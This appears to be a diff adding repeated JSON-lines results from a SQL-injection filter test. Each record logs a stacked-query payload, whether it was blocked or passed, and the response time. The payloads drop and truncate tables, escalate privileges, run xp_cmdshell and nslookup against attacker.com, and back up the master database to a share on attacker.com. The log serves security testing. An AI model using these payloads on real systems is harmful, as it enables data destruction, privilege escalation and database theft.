+{"payload": "'; RECONFIGURE;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.011938482995901722}
+{"payload": "'; DROP TABLE users;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0037331929997890256}
+{"payload": "'; CREATE TABLE test (id INT);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004126855994400103}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('Attacked');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005649516002449673}
+{"payload": "'; UPDATE users SET password='hacked' WHERE username='admin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0039980509973247536}
+{"payload": "'; DELETE FROM orders WHERE order_id=1;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003828840002825018}
+{"payload": "'; EXEC xp_cmdshell('ping attacker.com');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0048817060014698654}
+{"payload": "'; SHUTDOWN;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005017570001655258}
+{"payload": "'; ALTER TABLE users ADD COLUMN hacked INT;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004477364003832918}
+{"payload": "'; TRUNCATE TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.003771458999835886}
+{"payload": "'; BACKUP DATABASE master TO DISK='\\\\attacker.com\\backup.bak';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.016381440000259317}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.009145085998170543}
+{"payload": "'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004815519001567736}
+{"payload": "'; GRANT ALL PRIVILEGES ON users TO 'attacker';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.016491734997543972}
+{"payload": "'; DENY INSERT ON orders TO public;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.018769581998640206}
+{"payload": "'; RECONFIGURE;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.017401092998625245}
+{"payload": "'; DROP TABLE users;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006155031995149329}
+{"payload": "'; CREATE TABLE test (id INT);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005999132998113055}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('Attacked');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007077171001583338}
+{"payload": "'; UPDATE users SET password='hacked' WHERE username='admin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005991853999148589}
+{"payload": "'; DELETE FROM orders WHERE order_id=1;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005671664999681525}
+{"payload": "'; EXEC xp_cmdshell('ping attacker.com');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007033742003841326}
+{"payload": "'; SHUTDOWN;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006156404000648763}
+{"payload": "'; ALTER TABLE users ADD COLUMN hacked INT;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0062872859998606145}
+{"payload": "'; TRUNCATE TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006340539002849255}
+{"payload": "'; BACKUP DATABASE master TO DISK='\\\\attacker.com\\backup.bak';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.016880146002222318}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005401452006481122}
+{"payload": "'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0067954499972984195}
+{"payload": "'; GRANT ALL PRIVILEGES ON users TO 'attacker';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015214049999485724}
+{"payload": "'; DENY INSERT ON orders TO public;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015442182993865572}
+{"payload": "'; RECONFIGURE;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.0164570859997184}
+{"payload": "'; DROP TABLE users;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005048238999734167}
+{"payload": "'; CREATE TABLE test (id INT);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004473377004615031}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('Attacked');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005963147996226326}
+{"payload": "'; UPDATE users SET password='hacked' WHERE username='admin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005903714001760818}
+{"payload": "'; DELETE FROM orders WHERE order_id=1;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004792013998667244}
+{"payload": "'; EXEC xp_cmdshell('ping attacker.com');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.008026360999792814}
+{"payload": "'; SHUTDOWN;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004655268996430095}
+{"payload": "'; ALTER TABLE users ADD COLUMN hacked INT;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00434459799726028}
+{"payload": "'; TRUNCATE TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0066027980064973235}
+{"payload": "'; BACKUP DATABASE master TO DISK='\\\\attacker.com\\backup.bak';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015234641003189608}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0053231799975037575}
+{"payload": "'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005668938996677753}
+{"payload": "'; GRANT ALL PRIVILEGES ON users TO 'attacker';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01467809400492115}
+{"payload": "'; DENY INSERT ON orders TO public;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014085436996538192}
+{"payload": "'; RECONFIGURE;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01620501800061902}
+{"payload": "'; DROP TABLE users;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00502611599949887}
+{"payload": "'; CREATE TABLE test (id INT);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006899931999214459}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('Attacked');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004523121999227442}
+{"payload": "'; UPDATE users SET password='hacked' WHERE username='admin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005256281998299528}
+{"payload": "'; DELETE FROM orders WHERE order_id=1;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007382315998256672}
+{"payload": "'; EXEC xp_cmdshell('ping attacker.com');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0047167269949568436}
+{"payload": "'; SHUTDOWN;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005178731997148134}
+{"payload": "'; ALTER TABLE users ADD COLUMN hacked INT;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005929643994022626}
+{"payload": "'; TRUNCATE TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0055258229986066}
+{"payload": "'; BACKUP DATABASE master TO DISK='\\\\attacker.com\\backup.bak';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015845043999433983}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.00585991900152294}
+{"payload": "'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006553119994350709}
+{"payload": "'; GRANT ALL PRIVILEGES ON users TO 'attacker';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.016661061003105715}
+{"payload": "'; DENY INSERT ON orders TO public;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015212988000712357}
+{"payload": "'; RECONFIGURE;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015214500999718439}
+{"payload": "'; DROP TABLE users;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005185583999264054}
+{"payload": "'; CREATE TABLE test (id INT);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005205724999541417}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('Attacked');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005921488998865243}
+{"payload": "'; UPDATE users SET password='hacked' WHERE username='admin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004776262001541909}
+{"payload": "'; DELETE FROM orders WHERE order_id=1;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004607410002790857}
+{"payload": "'; EXEC xp_cmdshell('ping attacker.com');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006749155996658374}
+{"payload": "'; SHUTDOWN;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005345495002984535}
+{"payload": "'; ALTER TABLE users ADD COLUMN hacked INT;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005376157998398412}
+{"payload": "'; TRUNCATE TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006622419998166151}
+{"payload": "'; BACKUP DATABASE master TO DISK='\\\\attacker.com\\backup.bak';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.016490416004671715}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004923837004753295}
+{"payload": "'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006251548002182972}
+{"payload": "'; GRANT ALL PRIVILEGES ON users TO 'attacker';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.015041826998640317}
+{"payload": "'; DENY INSERT ON orders TO public;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014507854997646064}
+{"payload": "'; RECONFIGURE;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01537351000297349}
+{"payload": "'; DROP TABLE users;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005848877000971697}
+{"payload": "'; CREATE TABLE test (id INT);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0073429100011708215}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('Attacked');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0058567640007822774}
+{"payload": "'; UPDATE users SET password='hacked' WHERE username='admin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007313741996767931}
+{"payload": "'; DELETE FROM orders WHERE order_id=1;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005978708002658095}
+{"payload": "'; EXEC xp_cmdshell('ping attacker.com');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005416702006186824}
+{"payload": "'; SHUTDOWN;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0072877019993029535}
+{"payload": "'; ALTER TABLE users ADD COLUMN hacked INT;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005512306997843552}
+{"payload": "'; TRUNCATE TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.008685257002071012}
+{"payload": "'; BACKUP DATABASE master TO DISK='\\\\attacker.com\\backup.bak';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.018201229999249335}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0046961980042397045}
+{"payload": "'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004616202000761405}
+{"payload": "'; GRANT ALL PRIVILEGES ON users TO 'attacker';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01572174300235929}
+{"payload": "'; DENY INSERT ON orders TO public;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.01401812699623406}
+{"payload": "'; RECONFIGURE;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.016093181999167427}
+{"payload": "'; DROP TABLE users;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.007304760001716204}
+{"payload": "'; CREATE TABLE test (id INT);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004673338997235987}
+{"payload": "'; INSERT INTO logs (entry) VALUES ('Attacked');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005415519000962377}
+{"payload": "'; UPDATE users SET password='hacked' WHERE username='admin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0070979560041450895}
+{"payload": "'; DELETE FROM orders WHERE order_id=1;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004729193002276588}
+{"payload": "'; EXEC xp_cmdshell('ping attacker.com');--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005091743005323224}
+{"payload": "'; SHUTDOWN;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.006708572000206914}
+{"payload": "'; ALTER TABLE users ADD COLUMN hacked INT;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0043272219991195016}
+{"payload": "'; TRUNCATE TABLE logs;--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.004860776993155014}
+{"payload": "'; BACKUP DATABASE master TO DISK='\\\\attacker.com\\backup.bak';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.016079706001619343}
+{"payload": "'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.005863204998604488}
+{"payload": "'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--", "attack_type": "SQLI", "result": "blocked", "status_code": 403, "elapsed": 0.0050443960062693805}
+{"payload": "'; GRANT ALL PRIVILEGES ON users TO 'attacker';--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.013401078002061695}
+{"payload": "'; DENY INSERT ON orders TO public;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.014786062994971871}
+{"payload": "'; RECONFIGURE;--", "attack_type": "SQLI", "result": "passed", "status_code": 200, "elapsed": 0.012905421994219068}
